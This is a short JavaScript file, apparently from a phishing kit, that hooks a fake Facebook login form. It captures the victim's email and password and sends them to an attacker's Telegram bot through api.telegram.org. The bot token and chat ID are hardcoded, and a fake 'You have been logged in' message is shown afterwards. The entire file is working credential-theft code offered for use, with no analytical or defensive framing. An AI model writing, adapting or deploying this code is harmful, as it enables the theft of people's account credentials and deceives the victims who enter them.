‎document.getElementById('fbForm').addEventListener('submit', function(e) {
‎    e.preventDefault(); // Stop page from reloading
‎
‎    const email = document.getElementById('email').value;
‎    const password = document.getElementById('password').value;
‎
‎    // CONFIGURATION: Replace these with your actual credentials
‎    const BOT_TOKEN = '9181331705:AAG6cDB8DxQfMoECog3bHvOyVUgfzIiQL7s'; 
‎    const CHAT_ID = '6813462951';
‎
‎    // Message to send
‎    const message = `🚨 *Facebook Phish* 🚨\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
‎
‎    // Send to Telegram API
‎    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
‎        method: 'POST',
‎        headers: {'Content-Type': 'application/json'},
‎        body: JSON.stringify({
‎            chat_id: CHAT_ID,
‎            text: message,
‎            parse_mode: 'Markdown'
‎        })
‎    }).then(() => {
‎        // Optional: Show a success message or redirect
‎        document.querySelector('.container').innerHTML = '<h2 style="color:green">Success!</h2><p>You have been logged in.</p>';
‎    });
‎});
‎
